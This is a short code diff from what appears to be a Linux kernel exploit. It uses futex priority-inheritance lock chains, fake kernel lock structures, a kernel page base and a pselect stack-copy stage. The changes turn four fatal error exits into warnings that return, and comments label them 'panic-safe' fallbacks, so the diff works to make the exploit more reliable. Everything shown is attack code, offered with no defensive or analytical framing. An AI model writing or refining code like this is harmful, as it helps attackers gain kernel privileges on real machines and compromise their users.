@@ -138,8 +138,9 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 
 void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
-    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
-             page_base, fake_lock, fake_w0);
+    /* Panic-safe: 缺少内核页基址, 回退而非 exit */
+    pr_warning("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
+               page_base, fake_lock, fake_w0);
     return;
   }
 
@@ -153,7 +154,8 @@ void slide_pselect_stack_copy(void) {
   }
   int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
   if (high_read < 0) {
-    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
+    /* Panic-safe: F_DUPFD 失败回退而非 exit */
+    pr_warning("slide pselect F_DUPFD read errno=%d\n", errno);
     if (block_fd != pipefd[0]) {
       close(block_fd);
     }
@@ -267,7 +269,8 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&slide_waiter_tid, tid);
 
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter lock chain errno=%d\n", errno);
+    /* Panic-safe: waiter 锁链失败回退而非 exit */
+    pr_warning("slide waiter lock chain errno=%d\n", errno);
     return NULL;
   }
 
@@ -299,7 +302,8 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide owner lock target errno=%d\n", errno);
+    /* Panic-safe: owner 锁目标失败回退而非 exit */
+    pr_warning("slide owner lock target errno=%d\n", errno);
     return NULL;
   }
 
